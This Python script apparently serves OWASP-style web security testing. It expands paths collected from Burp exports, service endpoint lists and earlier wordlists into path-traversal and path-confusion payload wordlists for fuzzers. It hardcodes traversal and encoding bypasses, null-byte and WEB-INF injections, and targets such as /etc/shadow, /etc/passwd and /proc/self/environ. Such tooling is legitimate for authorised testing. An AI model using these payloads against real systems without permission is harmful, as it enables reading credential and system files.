#!/usr/bin/env python3
"""
WSTG-CONF-13 — Path Confusion / Path Traversal Rehasher

Collects real paths from three sources (merged + deduplicated):
  1. Burp Suite XML export (observed sitemap paths)
  2. Services JSON (CommonEndpoints + UndesirableEndpoints, service-matched)
  3. Previously generated wordlists (e.g. from CONF-02..09)

Then expands each real path by combining it with path confusion payloads:
  - Prepend payloads   (../../ + /real/path)
  - Append payloads    (/real/path + /..)
  - Inject payloads    (/real/../injected/path)
  - Null-byte variants
  - URL-encoded variants
  - Double-encoded variants
  - Semicolon/parameter injection variants

Output is a flat wordlist suitable for Intruder / ffuf / feroxbuster.

Usage:
  python3 conf13_path_confusion.py \\
      --xml   inputs/xml/export.xml \\
      --json  inputs/services.json \\
      --wordlists inputs/wordlists/conf02.txt inputs/wordlists/conf09.txt \\
      -o inputs/wordlists/conf13_confused.txt

Flags:
  --xml            Burp Suite XML export (optional)
  --json           Services JSON (optional, requires --xml for service matching)
  -w / --wordlists One or more prior wordlist .txt files to merge (optional)
  -o / --output    Output wordlist path
  --no-encode      Skip URL-encoded and double-encoded variants (smaller output)
  --depth          Max traversal depth for ../ sequences (default: 6)
"""

import argparse
import base64
import sys
import os
import re
import xml.etree.ElementTree as ET
import json
from urllib.parse import quote, urlparse
from pathlib import Path


# ---------------------------------------------------------------------------
# Path confusion payloads
# ---------------------------------------------------------------------------

# Traversal sequences (raw) — will be combined at various depths
TRAVERSAL_SEQS = ["../", "..\\", ".../", "....//", "..;/"]

# Absolute Linux log / config paths worth probing via traversal
ABSOLUTE_TARGETS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/version",
    "/proc/self/cmdline",
    "/var/log/syslog",
    "/var/log/auth.log",
    "/var/log/nginx/access.log",
    "/var/log/apache2/access.log",
]

# Path normalisation bypass tricks (appended to real paths)
APPEND_PAYLOADS = [
    "/..",
    "/.",
    "//",
    "/./",
    "/%2e/",
    "/%2e%2e/",
    "/..;/",
    "/.%00",
    "%00",
    "%00.html",
    ";/",
    ";/../",
    "?../",
    "#../",
    "/~",
]

# Path parameter injection (appended to real paths — semicolon variants)
PARAM_PAYLOADS = [
    ";param=../",
    ";jsessionid=x/../",
    ";/WEB-INF/",
    ";/../WEB-INF/web.xml",
]

# Prefix injection (prepended before the real path)
PREFIX_PAYLOADS = [
    "/public/../",
    "/static/../",
    "/assets/../",
    "/media/../",
    "/images/../",
    "/img/../",
    "/uploads/../",
    "/files/../",
    "/download/../",
    "/v1/../",
    "/api/v1/../",
    "/api/../",
]

# Null-byte suffixes
NULL_SUFFIXES = [
    "%00",
    "%00.jpg",
    "%00.html",
    "\x00",
    "%2500",
]

# URL-encoded traversal segments (single-encode)
ENCODED_TRAVERSAL = [
    "%2e%2e/",
    "%2e%2e%2f",
    "..%2f",
    "..%5c",
    "%2e%2e%5c",
    "%252e%252e%252f",   # double-encoded
    "..%252f",           # double-encoded /
    "..%c0%af",          # overlong UTF-8
    "..%c1%9c",          # overlong UTF-8 backslash
]


def build_traversal_payloads(depth: int) -> list:
    """Build ../../../ style sequences for depths 1..depth for each seq variant."""
    payloads = []
    for seq in TRAVERSAL_SEQS:
        for d in range(1, depth + 1):
            payloads.append(seq * d)
    return payloads


# ---------------------------------------------------------------------------
# Combination logic
# ---------------------------------------------------------------------------

def combine(real_paths: set, depth: int, no_encode: bool) -> set:
    """
    Produce confused path variants from the real paths.
    Returns a set of strings — all are relative web paths (start with /).
    """
    results = set()
    traversals = build_traversal_payloads(depth)

    for path in real_paths:
        # Normalise: ensure starts with /
        p = path.strip()
        if not p.startswith('/'):
            p = '/' + p

        # 1. Prepend traversal + absolute target
        #    e.g.  /api/v1/../../etc/passwd
        for trav in traversals:
            depth_steps = trav.count('../') + trav.count('..\\')
            # Build a version that climbs from the path then hits target
            prefix = p + '/' + trav
            for target in ABSOLUTE_TARGETS:
                results.add(prefix + target.lstrip('/'))

        # 2. Append payloads to real path
        for ap in APPEND_PAYLOADS:
            results.add(p + ap)

        # 3. Parameter / semicolon injection
        for pp in PARAM_PAYLOADS:
            results.add(p + pp)

        # 4. Prefix injection (replace root with bypassed prefix)
        for pfx in PREFIX_PAYLOADS:
            results.add(pfx + p.lstrip('/'))

        # 5. Encoded variants (skip if --no-encode)
        if not no_encode:
            for enc in ENCODED_TRAVERSAL:
                results.add(p + '/' + enc)
                # Also embed encoded seq mid-path at each segment boundary
                parts = p.split('/')
                for i in range(1, len(parts)):
                    new_parts = parts[:i] + [enc.rstrip('/')] + parts[i:]
                    results.add('/'.join(new_parts))

        # 6. Null-byte suffixes on real path (useful for file-read bypass)
        if not no_encode:
            for ns in NULL_SUFFIXES:
                results.add(p + ns)

        # 7. Double-slash normalisation bypass
        results.add(p.replace('/', '//'))
        results.add('//' + p.lstrip('/'))

        # 8. Keep the real path itself (always include)
        results.add(p)

    return results


# ---------------------------------------------------------------------------
# Burp XML helpers
# ---------------------------------------------------------------------------

TARGET_HEADERS = [
    'server', 'x-powered-by', 'x-aspnet-version', 'x-generator',
    'x-drupal-cache', 'x-varnish', 'x-cache', 'x-served-by',
    'x-runtime', 'x-frame-options', 'x-content-type-options',
    'x-xss-protection', 'x-pingback', 'link', 'via', 'x-forwarded-server',
    'x-proxy', 'x-load-balancer', 'x-application-context', 'x-version',
    'x-service', 'x-application', 'x-technology', 'x-framework',
    'x-cms', 'x-webserver', 'x-backend', 'x-frontend', 'x-middleware',
]

HEADER_NAME_INDICATORS = [
    'x-drupal-cache', 'x-varnish', 'x-cache', 'x-served-by',
    'x-pingback', 'x-generator', 'x-powered-by', 'x-aspnet-version',
    'x-runtime', 'x-application-context', 'x-version', 'x-service',
    'x-application', 'x-technology', 'x-framework', 'x-cms',
    'x-webserver', 'x-backend', 'x-frontend', 'x-middleware',
]

IGNORE_WORDS = {'server', 'service', 'http', 'https', 'ssl', 'tls', 'web', 'application', 'api'}


def decode_element(elem) -> str:
    if elem is None:
        return ""
    raw = elem.text or ""
    if elem.attrib.get("base64", "false").lower() == "true":
        try:
            return base64.b64decode(raw).decode("utf-8", errors="replace")
        except Exception:
            return raw
    return raw


def parse_burp_xml(xml_path: str):
    try:
        tree = ET.parse(xml_path)
    except FileNotFoundError:
        print(f"[!] XML not found: {xml_path}")
        sys.exit(1)
    except ET.ParseError as e:
        print(f"[!] XML parse error: {e}")
        sys.exit(1)
    items = tree.getroot().findall('.//item')
    if not items:
        print("[!] No <item> elements found in XML.")
        sys.exit(1)
    return items


def extract_paths_from_xml(items) -> set:
    """Pull the path portion from every URL in the Burp sitemap."""
    paths = set()
    for item in items:
        url_elem = item.find('./url')
        url = ""
        if url_elem is not None and url_elem.text:
            url = url_elem.text.strip()
        else:
            # Fallback: parse from request first line
            req = decode_element(item.find('./request'))
            if req:
                first = req.split('\n', 1)[0].strip()
                parts = first.split(' ')
                if len(parts) >= 2:
                    url = parts[1]

        if url:
            try:
                parsed = urlparse(url)
                path = parsed.path
                if path and path != '/':
                    paths.add(path)
            except Exception:
                pass
    return paths


def extract_headers_from_response(response_text: str):
    lines = response_text.split('\r\n')
    headers = []
    for line in lines[1:]:
        if not line or line.isspace():
            break
        parts = line.split(':', 1)
        if len(parts) == 2:
            headers.append((parts[0].strip(), parts[1].strip()))
    return headers


def collect_server_info(items) -> list:
    seen = set()
    result = []
    for item in items:
        resp_text = decode_element(item.find('./response'))
        if not resp_text:
            continue
        headers = extract_headers_from_response(resp_text)
        for name, value in headers:
            if any(t in name.lower() for t in TARGET_HEADERS):
                line = f"{name}: {value}"
                if line not in seen:
                    seen.add(line)
                    result.append(line)
    return result


# ---------------------------------------------------------------------------
# Service matching
# ---------------------------------------------------------------------------

def normalize(text: str) -> str:
    return re.sub(r'[^a-zA-Z0-9\s]', '', text.lower())


def service_keywords(service_name: str) -> list:
    words = re.findall(r'\b\w+\b', service_name.lower())
    return [w for w in words if len(w) > 2 and w not in IGNORE_WORDS]


def should_match_name(header_name: str) -> bool:
    return any(ind in header_name for ind in HEADER_NAME_INDICATORS)


def extract_header_parts(line: str):
    if ':' in line:
        parts = line.split(':', 1)
        return parts[0].strip().lower(), parts[1].strip()
    return None, line


def extract_paths_from_json(server_info: list, services_data: dict) -> set:
    """Return all CommonEndpoints + UndesirableEndpoints from matched services."""
    paths = set()
    matched_names = set()

    for line in server_info:
        header_name, header_value = extract_header_parts(line)
        if header_name == 'server':
            match_text = header_value
        elif header_name and should_match_name(header_name):
            match_text = header_name
        else:
            match_text = line

        norm = normalize(match_text)

        for port_info in services_data.get('Ports', []):
            for svc in port_info.get('PotentialServices', []):
                svc_name = svc.get('Service', '')
                found = False

                if svc_name.lower() in match_text.lower():
                    found = True
                if not found:
                    for kw in service_keywords(svc_name):
                        if kw in norm:
                            found = True
                            break
                if not found:
                    for word in re.findall(r'\b\w+\b', norm):
                        if len(word) > 2 and word in normalize(svc_name):
                            found = True
                            break

                if found and svc_name not in matched_names:
                    matched_names.add(svc_name)
                    for ep in svc.get('CommonEndpoints', []):
                        paths.add(ep)
                    for ep in svc.get('UndesirableEndpoints', []):
                        paths.add(ep)

    if matched_names:
        print(f"[*] Matched services ({len(matched_names)}): {', '.join(sorted(matched_names))}")

    return paths


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description='CONF-13: Path Confusion / Traversal Rehasher — expands real paths with confusion payloads'
    )
    p.add_argument(
        '--xml', '-x',
        help='Burp Suite XML export (for observed sitemap paths + service matching)'
    )
    p.add_argument(
        '--json', '-j',
        help='Services JSON (for endpoint pool from matched services; requires --xml)'
    )
    p.add_argument(
        '--wordlists', '-w', nargs='+',
        help='One or more prior wordlist .txt files to merge as path sources'
    )
    p.add_argument(
        '-o', '--output',
        default='inputs/wordlists/conf13_confused.txt',
        help='Output wordlist (default: inputs/wordlists/conf13_confused.txt)'
    )
    p.add_argument(
        '--depth', type=int, default=6,
        help='Max ../ traversal depth (default: 6)'
    )
    p.add_argument(
        '--no-encode', action='store_true',
        help='Skip URL-encoded, double-encoded, and null-byte variants'
    )
    return p.parse_args()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args = parse_args()

    if not args.xml and not args.json and not args.wordlists:
        print("[!] At least one of --xml, --json, or --wordlists is required.")
        sys.exit(1)

    print("=" * 60)
    print("CONF-13 — Path Confusion Rehasher")
    print("=" * 60)

    real_paths = set()

    # Source 1: Burp XML sitemap paths
    xml_items = None
    if args.xml:
        xml_items = parse_burp_xml(args.xml)
        xml_paths = extract_paths_from_xml(xml_items)
        print(f"[*] Paths from Burp XML sitemap: {len(xml_paths)}")
        real_paths.update(xml_paths)

    # Source 2: Services JSON (needs service matching from XML headers)
    if args.json:
        try:
            with open(args.json) as f:
                services_data = json.load(f)
        except FileNotFoundError:
            print(f"[!] Services JSON not found: {args.json}")
            sys.exit(1)
        except json.JSONDecodeError as e:
            print(f"[!] Invalid services JSON: {e}")
            sys.exit(1)

        server_info = []
        if xml_items:
            server_info = collect_server_info(xml_items)
            print(f"[*] Server info lines for matching: {len(server_info)}")
        else:
            print("[!] --json provided without --xml — using all svc_json endpoints unfiltered")
            # Pull everything without service matching
            for port_info in services_data.get('Ports', []):
                for svc in port_info.get('PotentialServices', []):
                    for ep in svc.get('CommonEndpoints', []):
                        real_paths.add(ep)
                    for ep in svc.get('UndesirableEndpoints', []):
                        real_paths.add(ep)

        if server_info:
            json_paths = extract_paths_from_json(server_info, services_data)
            print(f"[*] Paths from services JSON (matched): {len(json_paths)}")
            real_paths.update(json_paths)

    # Source 3: Prior wordlist files
    if args.wordlists:
        for wl_path in args.wordlists:
            try:
                with open(wl_path) as f:
                    wl_paths = set()
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            wl_paths.add(line)
                print(f"[*] Paths from {wl_path}: {len(wl_paths)}")
                real_paths.update(wl_paths)
            except FileNotFoundError:
                print(f"[!] Wordlist not found (skipping): {wl_path}")

    if not real_paths:
        print("[!] No real paths collected from any source. Exiting.")
        sys.exit(1)

    print(f"\n[*] Total unique real paths (all sources): {len(real_paths)}")
    print(f"[*] Traversal depth: {args.depth}")
    print(f"[*] Encoded variants: {'disabled' if args.no_encode else 'enabled'}")
    print(f"[*] Building confused path set...")

    confused = combine(real_paths, args.depth, args.no_encode)
    print(f"[*] Confused path variants generated: {len(confused)}")

    # Write output
    os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
    sorted_paths = sorted(confused)

    with open(args.output, 'w') as f:
        f.write("# CONF-13 Path Confusion / Traversal Wordlist\n")
        f.write(f"# Real path sources: XML={'yes' if args.xml else 'no'}, "
                f"JSON={'yes' if args.json else 'no'}, "
                f"Wordlists={len(args.wordlists) if args.wordlists else 0} file(s)\n")
        f.write(f"# Real paths: {len(real_paths)}  |  Confused variants: {len(confused)}\n")
        f.write(f"# Traversal depth: {args.depth}  |  Encoded: {not args.no_encode}\n\n")
        for path in sorted_paths:
            f.write(path + '\n')

    print(f"\n[+] Wordlist written → {args.output} ({len(sorted_paths)} entries)")

    print(f"\n{'=' * 60}")
    print("CONF-13 SUMMARY")
    print(f"{'=' * 60}")
    print(f"  Real paths collected:     {len(real_paths)}")
    print(f"  Confused variants:        {len(confused)}")
    print(f"  Traversal depth:          {args.depth}")
    print(f"  Encoded variants:         {not args.no_encode}")
    print(f"  Output:                   {args.output}")


if __name__ == "__main__":
    main()
